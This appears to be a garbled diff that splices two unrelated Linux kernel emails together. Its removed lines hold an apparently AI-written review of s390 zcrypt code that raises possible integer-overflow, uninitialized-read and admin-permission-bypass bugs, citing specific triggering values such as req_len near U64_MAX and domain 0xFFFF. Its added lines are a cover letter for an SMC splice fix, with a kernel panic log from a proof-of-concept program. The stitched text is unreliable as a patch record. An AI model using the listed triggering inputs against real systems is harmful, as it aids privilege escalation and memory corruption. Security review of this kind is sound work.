-In drivers/s390/crypto/zcrypt_msgtype6.c:xcrb_msg_to_type6_ep11cprb_msgx():
+----BEGIN crash log----
 
-    ap_msg->len =3D sizeof(struct type6_hdr) + CEIL4(xcrb->req_len);
-    if (ap_msg->len > ap_msg->bufsize)
-        return -EINVAL;
+[   99.609149][   T29] audit: type=1400 audit(1781096375.697:35): avc:  denied  { write } for  pid=9261 comm="mini_poc" scontext=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 tcontext=system_u:object_r:unlabeled_t:s0 tclass=smc_socket permissive=1
+[   99.612034][ T9261] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x36f30
+[   99.614228][ T9261] flags: 0xfff00000000000(node=0|zone=1|lastcpupid=0x7ff)
+[   99.615006][ T9261] page_type: f0(buddy)
+[   99.617554][ T9261] page dumped because: VM_BUG_ON_FOLIO(((unsigned int) folio_ref_count(folio) + 127u <= 127u))
+[   99.618643][ T9261] page_owner tracks the page as freed
+[   99.619251][ T9261] page last allocated via order 4, migratetype Unmovable, gfp_mask 0xd2dc0(GFP_KERNEL|__GFP_ZERO|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 9261, tgid 9261 (mini_poc), ts 99605686630, free_ts 99611922370
+[   99.630382][ T9261] page last free pid 9261 tgid 9261 stack trace:
+[   99.631009][ T9261]  __free_pages_ok+0x63f/0xe80
+[   99.631502][ T9261]  __folio_put+0x320/0x4f0
+[   99.631988][ T9261]  smc_rx_pipe_buf_release+0x418/0x4e0
+[   99.632561][ T9261]  anon_pipe_read+0x5ac/0x1120
+[   99.633048][ T9261]  vfs_read+0xa33/0xc70
+[   99.633458][ T9261]  ksys_read+0x1ef/0x240
+[   99.633890][ T9261]  do_syscall_64+0x11f/0x860
+[   99.634374][ T9261]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[   99.635404][ T9261] ------------[ cut here ]------------
+[   99.635908][ T9261] kernel BUG at include/linux/mm.h:2051!
+[   99.637933][ T9261] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
+[   99.638597][ T9261] CPU: 1 UID: 0 PID: 9261 Comm: mini_poc Not tainted 7.1.0-rc6-00220-g627366c51145 #4 PREEMPT(full)
+[   99.653791][ T9261]  smc_splice_read+0x287/0x420
+[   99.654311][ T9261]  sock_splice_read+0xb7/0x120
+[   99.655927][ T9261]  do_splice_read+0x285/0x360
+[   99.656630][ T9261]  splice_file_to_pipe+0x108/0x120
+[   99.657638][ T9261]  do_splice+0x1500/0x1f40
+[   99.658867][ T9261]  __do_splice+0x14d/0x270
+[   99.659368][ T9261]  __x64_sys_splice+0x18f/0x260
+[   99.660107][ T9261]  do_syscall_64+0x11f/0x860
+[   99.660521][ T9261]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[   99.668234][ T9261] RIP: 0010:smc_rx_recvmsg+0x2573/0x2ca0
+[   99.676748][ T9261] Kernel panic - not syncing: Fatal exception
 
-If a userspace caller passes an ioctl with req_len equal to U64_MAX - 79,
-CEIL4(req_len) evaluates to U64_MAX - 79. Adding sizeof(struct type6_hdr)
-wraps the 64-bit value to 8, completely bypassing the buffer bounds check.
 
-Would the subsequent copy_from_user() then zero-fill the kernel heap on
-failure and cause memory corruption?
+-----END crash log-----
 
+Changes in v2:
+- Rebase onto the latest net tree at 14fa65d10f5696b063a7d8d26e8291ea84a2c6ed.
+- Keep the offset declaration in its original position per Dust Li.
+- Add Reviewed-by tags from Dust Li and Sidraya Jayagond.
 
-[Severity: High]
-This is a pre-existing issue, but the EP11 request path seems to lack the
-minimum size validation that this patch adds to the CCA path.
+Daming Li (1):
+  net: smc: fix splice entry lifetime imbalance in smc_rx_splice
 
-In drivers/s390/crypto/zcrypt_msgtype6.c:xcrb_msg_to_type6_ep11cprb_msgx():
+net/smc/smc_rx.c | 19 ++++++++++---------
+ 1 file changed, 10 insertions(+), 9 deletions(-)
 
-    if (z_copy_from_user(userspace, msg->userdata,
-                         (char __force __user *)xcrb->req, xcrb->req_len)) {
-
-If an attacker submits an EP11 ioctl with a small req_len (e.g., 4 bytes),
-the kernel copies only 4 bytes. Could the function then read EP11 structure
-fields such as msg->pld_lenfmt and msg->cprbx.flags from uninitialized
-memory to determine function codes and domains?
-
-
-[Severity: High]
-This isn't a bug introduced by this patch, but looking at the domain
-permissions, is there a way to bypass administrative checks?
-
-In drivers/s390/crypto/zcrypt_api.c:_zcrypt_send_cprb():
-
-    if (perms !=3D &ap_perms && domain < AP_DOMAINS) {
-        if (ap_msg.flags & AP_MSG_FLAG_ADMIN) {
-            if (!test_bit_inv(domain, perms->adm)) {
-
-And similarly in _zcrypt_send_ep11_cprb():
-
-    if (perms !=3D &ap_perms && domain < AUTOSEL_DOM) {
-        if (ap_msg.flags & AP_MSG_FLAG_ADMIN) {
-            if (!test_bit_inv(domain, perms->adm)) {
-
-If a user submits a CPRBX or EP11 request containing an administrative
-command and sets the embedded domain field to 0xFFFF (AUTOSEL_DOM), the
-condition domain < AP_DOMAINS evaluates to false.
-
-Does this cause the administrative permission check to be completely skippe=
-d,
-allowing a user with only usage privileges to execute administrative
-commands on that domain?
-
---=20
-Sashiko AI review =C2=B7 https://sashiko.dev/#/patchset/20260730141509.2059=
-70-1-freude@linux.ibm.com?part=3D2
+-- 
+2.34.1
